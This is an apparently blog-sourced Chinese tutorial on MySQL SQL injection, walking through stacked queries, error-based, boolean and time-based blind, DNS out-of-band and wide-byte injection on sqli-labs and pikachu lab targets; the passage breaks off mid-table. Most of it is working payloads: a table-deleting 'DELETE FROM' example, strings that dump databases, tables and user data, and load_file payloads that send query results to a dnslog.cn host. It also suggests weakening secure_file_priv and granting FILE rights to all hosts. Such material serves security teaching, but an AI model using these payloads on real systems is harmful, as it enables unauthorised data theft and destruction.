<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<blockquote>
<p>注：Oracle数据库无法使用堆叠查询。MySQL、PostgreSQL、SQLServer可以使用堆叠查询。</p>
</blockquote>
<h3 id="堆叠注入靶场复现"><a href="#堆叠注入靶场复现" class="headerlink" title="堆叠注入靶场复现"></a>堆叠注入靶场复现</h3><h4 id="sqli-labs-less-39"><a href="#sqli-labs-less-39" class="headerlink" title="sqli-labs less-39"></a>sqli-labs less-39</h4><p><strong>堆叠注入——字符型——GET</strong></p>
<p>源代码：</p>
<p><img src="https://i.loli.net/2021/10/05/OFHGZ31tLE4nmNd.png" alt="2767f275385d1378d9378e245dbd4b62.png"></p>
<p>可以方向查询语句是没有进行过滤的，而且使用PHP的<code>mysqli_multi_query()</code>查询多条语句。</p>
<p>由此构造我们的payload：<code>?id=1;insert into users(id,username,password) values(&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;) --+</code></p>
<p>执行完成，查看security数据库中的users数据表</p>
<p><img src="https://i.loli.net/2021/10/05/VNG4jXzCx8DwU6O.png" alt="3344e0ed0ac1baeca3f1d4eb2e3fa5d7.png"></p>
<p>成功插入了一条数据。</p>
<h4 id="sqli-labs-less-42"><a href="#sqli-labs-less-42" class="headerlink" title="sqli-labs less-42"></a>sqli-labs less-42</h4><p><strong>报错型堆叠注入——字符型——POST</strong></p>
<p>源代码（login.php）：</p>
<p><img src="https://i.loli.net/2021/10/05/INzeTAucsZJgjQw.png" alt="29efdb0b77231de66c6dd60bdd526ff6.png"></p>
<p>Password 变量在post 过程中，没有通过 <code>mysql_real_escape_string()</code> 函数的处理。因此在登录的时候密码选项我们可以进行 attack。</p>
<blockquote>
<p>mysql_real_escape_string() 函数作用：转义 SQL 语句中使用的字符串中的特殊字符。</p>
</blockquote>
<p>由此构造我们的payload：</p>
<p>username：任意</p>
<p>password：<code>c&#39;;create table like users #</code></p>
<p>security数据库下新增了一个me表</p>
<p><img src="https://i.loli.net/2021/10/05/wfxjHp6odzyMKsv.png" alt="c1bd08116ad7072d558bb9714c46a3cd.png"></p>
<h2 id="基于函数报错的注入"><a href="#基于函数报错的注入" class="headerlink" title="基于函数报错的注入"></a>基于函数报错的注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>这里主要记录一下<strong>xpath语法错误</strong>和<strong>主键重复错误</strong>。</p>
<p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code> 或 <code>updatexml</code> 两个函数。</p>
<p>使用条件：mysql版本&gt;5.1.5</p>
<h3 id="XPath语法错误"><a href="#XPath语法错误" class="headerlink" title="XPath语法错误"></a>XPath语法错误</h3><h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><p>正常语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(xml_document,Xpath_string)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：Xpath_string是xpath格式的字符串</li>
<li>作用：从目标xml中返回包含所查询值的字符串</li>
</ul>
<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>payload结构：<code>&#39;and extractvalue(1,concat(0x7e,(select语句),0x7e)) --+</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆字段名：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME),0x7e)) --+</span><br></pre></td></tr></table></figure>
<h4 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h4><p>正常语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(xml_document,xpath_string,new_value)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：xpath_string是xpath格式的字符串</li>
<li>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</li>
</ul>
<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>payload结构：<code>&#39;and updatexml(1,concat(0x7e,(select语句),0x7e),1) --+</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆字段名：&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME),0x7e),1) --+</span><br></pre></td></tr></table></figure>
<h3 id="主键重复错误"><a href="#主键重复错误" class="headerlink" title="主键重复错误"></a>主键重复错误</h3><p><strong>rand()：</strong></p>
<blockquote>
<p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p>
</blockquote>
<p><strong>floor()：</strong></p>
<blockquote>
<p>对任意正或者负的十进制值向下取整</p>
</blockquote>
<p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p>
<p><strong>group by</strong></p>
<blockquote>
<p>group by是根据一个或多个列对结果集进行分组的sql语句</p>
</blockquote>
<p><strong>报错原理：</strong></p>
<ul>
<li>如果<code>count(*)</code>与<code>group by</code>同时出现在SQL语句中，就会产生虚拟表。</li>
<li>向虚拟表中插入数据的操作包含两个动作：检查主键是否存在；如果不存在就插入新的主键，如果存在就将该主键所对应的的<code>count(*)</code>的值加1。</li>
<li>检查的主键值与插入的主键值不同的情况很少见。如果主键是函数表达式<code>floor(rand(0)*2)</code>，主键值是伪随机数列中的元素，那么在检查主键和插入主键时产生的两个值就可能不同。</li>
<li>由于<code>floor(rand(0)*2)</code>产生的值在检查虚拟表主键时与表内的主键值并不重复，因此会向虚拟表插入“新的”主键。但是，在插入时又会重新计算<code>floor(rand(0)*2)</code>的值，如果第二次计算的值刚好跟第一次计算的值不一样，又恰巧与表内现有的主键值重复，将导致MySQL报错。</li>
</ul>
<p>payload结构：<code>&#39;and (select 1 from (select count(*),concat(0x7e,(select语句),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x)a)--+</code></p>
<p><img src="https://i.loli.net/2021/10/05/sXLmv31tN72cGlY.png" alt="736de83719ff30ab41dcd3a546daf538.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a) --+</span><br><span class="line"></span><br><span class="line">爆列名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot; limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and (select 1 from (select count(*),concat(0x7e,(select COLUMN_NAME from TABLE_NAME limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br></pre></td></tr></table></figure>
<h2 id="基于布尔运算的盲注"><a href="#基于布尔运算的盲注" class="headerlink" title="基于布尔运算的盲注"></a>基于布尔运算的盲注</h2><p>基于布尔运算的盲注（Boolean-based blind SQL injection）是盲注的一种。</p>
<p>下面简单介绍一下盲注。如果攻击者想要获取信息无法直接显示在页面上，那么他可以通过返回页面的内容或响应时间的不同来获取相关信息，这种方式叫做盲注。盲注的信息获取效率不如其他类型的注入。在基于布尔运算的盲注后，应用程序仅会返回包含“True”或“False”的页面，因此，在一次完整的信息获取过程中往往需要多次进行请求和试探。</p>
<p>最简单的基于布尔盲注，形如<code>and 1=1</code> <code>and 1=2</code>。如果两次请求返回的页面不一样，则表示该接口处存在注入点。</p>
<p>如何利用布尔盲注payload获取数据？首先要了解MySQL的字符串截取函数，它们在构造payload的过程中起着重要作用。</p>
<ul>
<li>mid()函数：mid(string,start,length)，从字符串string中返回一个包含length个字符的子串，子串的起始位置在start处。</li>
<li>substr()函数：substr(string,start,length)，从字符串string中返回一个包含length个字符的子串，子串的起始位置在start处。</li>
<li>left()函数：left(string,length)，对字符串string，从左开始取length个字符的子串。</li>
<li>right()函数：right(string,length)，对字符串string，从右开始取length个字符的子串。</li>
</ul>
<p>构造布尔盲注的payload，其核心思想是：利用截取函数将想要获取信息的字符串拆分成单个字符，然后使用二分查找法进行猜解。</p>
<h3 id="测试正常回显与错误回显"><a href="#测试正常回显与错误回显" class="headerlink" title="测试正常回显与错误回显"></a>测试正常回显与错误回显</h3><p>在这里使用SQLi-LABS靶场第8关进行演示</p>
<p>正常回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>
<p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211006102936406.png" alt="image-20211006102936406"></p>
<p>错误回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/CNHXkE6QUd3RPVb.png" alt="c6abaef7e5faca1a6342f7154f292ecc.png"></p>
<h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><p>判断数据库的第1个字符的ASCII是否大于100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/image-20211006094959115.png" alt="image-20211006094959115"></p>
<p>回显正常，说明大于100</p>
<p>判断是否大于120</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))&gt;120 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/q6iRxYUKrTjSZlz.png" alt="bca1a9293491d8b26bc5d5d753f131d3.png"></p>
<p>回显错误，说明不大于120</p>
<p>通过二分法以此类推，最终可以判断第一个字符的ASCII值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/MIyOiTVDA9psurq.png" alt="963d023bcf803d5370102ec74f3f3734.png"></p>
<p>通过查找ASCII表可以判断该字符为“s”</p>
<p><img src="https://i.loli.net/2021/10/05/B8AGKLWJPS6Ng5Z.png" alt="79bb022428457989a1a33062014d1400.png"></p>
<p>同理，其他字符也可以通过盲注得出</p>
<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>步骤同上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>步骤如上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>步骤如上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;65 --+</span><br></pre></td></tr></table></figure>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>当使用其他方法无法从数据库服务器中检索信息时，攻击者就有可能使用基于时间的盲注（Time-based blind SQL injection）进行注入。其原理是：利用MySQL中的延迟函数查看SQL语句是否可以执行，也可以理解为通过页面响应时间判断延时语句是否执行成功，进而通过推断得到一些信息。所以时间型盲注也是一种边信道攻击。</p>
<h3 id="测试能否使用延时盲注"><a href="#测试能否使用延时盲注" class="headerlink" title="测试能否使用延时盲注"></a>测试能否使用延时盲注</h3><p>在这里使用SQLi-LABS靶场第9关进行演示</p>
<p>通过<code>and 1=1</code> <code>and 1=2</code> 无法判断回显正确与错误</p>
<p>这时查看能否使用sleep()函数测试</p>
<p>测试正常数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/image-20211006102818321.png" alt="image-20211006102818321"></p>
<p>说明and前的语句执行成功，执行sleep(5)，使得加载时多花了5秒时间</p>
<p>测试错误数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=-1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/jSZ1LVHYzgJeQNB.png" alt="e996bf3ced4f390797e770ab07d9bc86.png"></p>
<p>说明and前的语句执行错误，就不执行sleep(5)，加载时间和原来一样</p>
<p>通过这一特性，就可以使用布尔型盲注一样的方法去测试。</p>
<h3 id="猜解数据库名-1"><a href="#猜解数据库名-1" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解表名-1"><a href="#猜解表名-1" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解字段名-1"><a href="#猜解字段名-1" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据-1"><a href="#猜解数据-1" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;65,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a>BENCHMARK()函数</h3><p>在MySQL中，有一个<code>BENCHMARK()</code>函数，它是用于测试函数性能的。它有两个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
<p>函数执行的结果，是将表达式<code>expr</code>执行<code>count</code>次。</p>
<p>因此，利用<code>BENCHMARK()</code>函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短变化，可以判断出注入语句是否执行成功。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜解数据库名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解表名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解字段名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解数据：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;65,BENCHMARK(10000000,MD5(1)),null) --+</span><br></pre></td></tr></table></figure>
<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><h3 id="什么是带外通道技术"><a href="#什么是带外通道技术" class="headerlink" title="什么是带外通道技术"></a>什么是带外通道技术</h3><p>在渗透中，经常碰到关闭回显的漏洞，常见的XXE盲注，SQL盲注，反序列化无回显，这个时候常用到OOB带外数据通道，带外通道技术（OOB）让攻击者能够通过另一种方式来确认和利用所谓的盲目（blind）的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。</p>
<h3 id="OOB利用原理"><a href="#OOB利用原理" class="headerlink" title="OOB利用原理"></a>OOB利用原理</h3><p>1、常规SQL注入，获取服务器信息的方式</p>
<p><img src="https://i.loli.net/2021/10/05/I58SWpJs9d3yuPT.png" alt="img"></p>
<p>2、SQL注入利用DNS获取查询结果（OOB）</p>
<p>我们需要一个三级域名服务器（nameserver）也是DNS服务器（DNS Server），也就是下图的schloar服务器。</p>
<p>还需要配置域名“www.scholar.com”对应的解析IP地址为“schloar服务器”的IP地址。</p>
<p>这样就能够实时地监控域名查询请求了，图示如下：</p>
<p><img src="https://i.loli.net/2021/10/05/9wiITvejCJ5OAYS.png" alt="img"></p>
<h3 id="DNS带外注入靶场复现"><a href="#DNS带外注入靶场复现" class="headerlink" title="DNS带外注入靶场复现"></a>DNS带外注入靶场复现</h3><h4 id="实验提准备——DNSLog"><a href="#实验提准备——DNSLog" class="headerlink" title="实验提准备——DNSLog"></a>实验提准备——DNSLog</h4><p>打开DNSLog网站 (<a href="http://www.dnslog.cn)，点击Get">http://www.dnslog.cn)，点击Get</a> SubDomain得到一个子域名</p>
<p><img src="https://i.loli.net/2021/10/05/FyotJ3mSiKadfbz.png" alt="d0ae8c347502f14c5927c668dfa717b4.png"></p>
<p>发送ICMP包进行测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping cs1qjb.dnslog.cn</span><br></pre></td></tr></table></figure>
<p>回到DNSLog页面，刷新记录即可得到刚才ping查询的结果</p>
<p><img src="https://i.loli.net/2021/10/05/AKbO8e562qZfriN.png" alt="57fb30bbb46e75026e10984eeafb1517.png"></p>
<h4 id="实验前准备——load-file"><a href="#实验前准备——load-file" class="headerlink" title="实验前准备——load_file()"></a>实验前准备——load_file()</h4><p>MySQL使用带外注入的前提数据库必须配置<code>secure_file_priv</code>，且当前用户拥有读写数据的权限。</p>
<p>查看<code>secure_file_priv</code>变量的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
</li>
<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
</li>
<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/7oWsbEFl9LuvDz1.png" alt="fb1da6930b6d134621129dd36805e0ca.png"></p>
<p>若该值为NULL，则需要在mysql的配置文件（my.ini）中设置 <code>secure_file_priv = &#39;&#39;</code></p>
<p><img src="https://i.loli.net/2021/10/05/wdQE7KR9AxsjghG.png" alt="3209f789243f97414ec5928f97478fa4.png"></p>
<p>若当前数据库用户没有读写文件权限，可以使用GRANT语句授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT FILE ON *.* TO &#x27;user&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>注：<em>.</em>指所有数据库的数据表；user为当前用户；%为所有ip地址</p>
<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(&quot;\\\\test.cs1qjb.dnslog.cn\\xxx.txt&quot;)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061046744.png" alt="705994f52d3311ab0d725a7d25746092.png"></p>
<p>新增一条查询记录，可以进行带外注入</p>
<h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,database(),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/69OCAfLmvB3dDgS.png" alt="de6479cb29b3eacef1c3fea89821f39c.png"></p>
<h4 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/e26OHWr7myfvzsJ.png" alt="756705f2f600b14b681581c698792ac6.png"></p>
<h4 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/f2JXxzIacOhnNDL.png" alt="de2a849c5c357b5090903f062a9ec218.png"></p>
<h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select username from users limit 0,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/kGQjpMioBnr219q.png" alt="7b22f942a9dc01baf397d5397c0bc3cf.png"></p>
<h2 id="基于字符集的宽字节注入"><a href="#基于字符集的宽字节注入" class="headerlink" title="基于字符集的宽字节注入"></a>基于字符集的宽字节注入</h2><h3 id="宽字节注入介绍与原理"><a href="#宽字节注入介绍与原理" class="headerlink" title="宽字节注入介绍与原理"></a>宽字节注入介绍与原理</h3><p>注入攻击中常常会用单引号<code>&#39;</code>、双引号<code>&quot;</code>等特殊字符。在应用中，开发者为了安全，经常会使用转义字符<code>\</code>来转义这些特殊字符。当数据库使用了“宽字符集”时，可能会产生一些意想不到的漏洞。</p>
<p>想要深入理解MySQL中的宽字节注入，首先要了解一些转义函数（PHP），包括<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>、<code>magic_quote_gpc</code>（高版本的PHP去掉了这个函数）。转义函数可用于将MySQL注入Payload中的部分危险字符转义，使攻击者无法有效截断原语句并拼接自己想要的Payload语句，起到安全防护的作用。</p>
<p>宽字节是指两个字节的宽度的编码技术，例如GB2312、GBK、GB18030、BIG5等。宽字节对转义字符的影响发生在<code>character_set_client=gbk</code>的情况下，也就是说，如果客户端发送的数据使用的字符集是GBK，就可能会“吃掉”转义字符<code>\</code>，进而导致转义失败，执行攻击者构造的Payload。</p>
<p>若存在宽字节注入，攻击者在输入<code>%df%27</code>时，首先会通过前面提到的单引号转义，将其转换为<code>%df%5c%27</code>（<code>%5c</code>是反斜杠<code>\</code>的URL编码）。在进行数据库查询之前，由于使用了GBK多字节编码（在汉字编码范围内两个字节会被编码为一个汉字），MySQL服务器会对查询语句进行GBK编码，即将<code>%df%5c</code>转换成汉字“<strong>運</strong>”，而单引号将会“逃逸”，在使用查询语句中的单引号闭合。</p>
<h3 id="宽字节注入靶场复现"><a href="#宽字节注入靶场复现" class="headerlink" title="宽字节注入靶场复现"></a>宽字节注入靶场复现</h3><p>在这里使用pikachu靶场的宽字节注入进行演示。</p>
<p>首先提交表单并使用burpsuite进行抓包</p>
<p><img src="https://i.loli.net/2021/10/05/kJ9Xp4u3Pig25Oa.png" alt="44ad00a591e2148b85cc3cf22d8009fe.png"></p>
<p>发送到Repeater，构造payload <code>1%df&#39; or 1=1 #</code></p>
<p><img src="https://i.loli.net/2021/10/05/IGqYLAja7UPKbtC.png" alt="51a94ef6ff0f91bd17d192f75261d158.png"></p>
<p>可以看出爆出所有用户数据。</p>
<p>宽字节注入是绕过转义函数的一种手段，可结合其他注入攻击方式，payload很好构造，只需是在单引号前加上<code>%df</code>。</p>
<p>另外，基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题。比如在XSS攻击时，由于浏览器与服务器返回的字符编码不同，也可能会存在字符集攻击。</p>
<p>要解决这种问题，需要统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。统一设置为UTF-8是一个很好的方法。</p>
<h2 id="超长字符截断注入"><a href="#超长字符截断注入" class="headerlink" title="超长字符截断注入"></a>超长字符截断注入</h2><h3 id="超长字符截断原理"><a href="#超长字符截断原理" class="headerlink" title="超长字符截断原理"></a>超长字符截断原理</h3><p>在MySQL的配置选项中，有一个sql_mode选项。定义了mysql应该支持的sql语法，数据校验等。可以通过以下方式查看当前数据库使用的sql_mode：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@sql_mode;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/csaqRrNnOdePlxV.png" alt="img"></p>
<p>mysql5.0版本以上支持了三种sql_mode模式，如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>模式</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>ANSI</td>
<td>宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，报warning警告。</td>
</tr>
<tr>
